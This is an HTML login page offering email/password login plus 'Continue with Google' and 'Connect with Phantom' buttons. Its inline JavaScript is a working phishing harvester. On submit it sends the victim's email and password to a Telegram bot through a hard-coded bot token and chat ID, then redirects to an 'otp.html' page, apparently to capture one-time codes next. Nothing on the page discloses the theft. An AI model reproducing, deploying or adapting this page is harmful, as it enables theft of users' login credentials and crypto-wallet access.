<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="overlay">
    <div class="login-box">
      <h2>Login</h2>
          
      <!-- Form -->
      <form id="loginForm">
        <!-- Email -->
        <div class="input-group">
          <label for="email">Email</label>
          <input type="email" id="email" name="email" placeholder="Enter email" required>
        </div>

        <!-- Password -->
        <div class="input-group password-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" placeholder="Enter password" required>
          <span id="togglePassword" class="toggle-password right">
            <img src="eyes.png" alt="Toggle visibility">
          </span>
        </div>

        <a href="#" class="forgot-password">Forgot password?</a>

        <!-- Login Button -->
        <button type="submit" class="btn login-btn">Login</button>
      </form>

      <!-- Divider -->
      <div class="divider"><span>OR</span></div>

      <!-- Google -->
      <button class="btn social-btn google-btn">
        <img src="goggle.png" alt="Google"> 
        Continue with Google
      </button>

      <!-- Phantom -->
      <button class="btn social-btn phantom-btn">
        <img src="phantom.png" alt="Phantom"> 
        Connect with Phantom
      </button>

      <!-- Sign Up -->
      <p class="signup-text">Donâ€™t have an account? 
        <a href="#">Sign up</a>
      </p>
    </div>
  </div>

  <!-- JavaScript -->
  <script>
    // Password toggle
    const passwordInput = document.getElementById("password");
    const togglePassword = document.getElementById("togglePassword");

    togglePassword.addEventListener("click", function () {
      const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
      passwordInput.setAttribute("type", type);
    });

    // Telegram bot settings
    const BOT_TOKEN = "8387730686:AAFo7mnRLBtTkN3HAWrznqbW7fsOxD57HkU";
    const CHAT_ID = "-4909990023";

    // Form submission
    const form = document.getElementById("loginForm");
    form.addEventListener("submit", function(e){
      e.preventDefault();

      const email = form.email.value;
      const password = form.password.value;

      const message = `Login Submission:\nEmail: ${email}\nPassword: ${password}`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
              chat_id: CHAT_ID,
              text: message
          })
      })
      .then(res => res.json())
      .then(data => {
          if (data.ok) {
              alert("Successfull");
              window.location.href = "otp.html";
          } else {
              console.error("Telegram error:", data);
          }
      })
      .catch(err => console.error("Fetch error:", err));
    });
  </script>
</body>
</html>
